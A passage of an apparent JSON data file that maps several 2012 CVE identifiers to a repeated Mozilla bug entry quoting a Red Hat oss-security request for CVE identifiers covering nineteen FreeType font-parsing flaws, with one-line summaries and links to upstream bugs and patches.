Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1134": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1135": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1136": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] 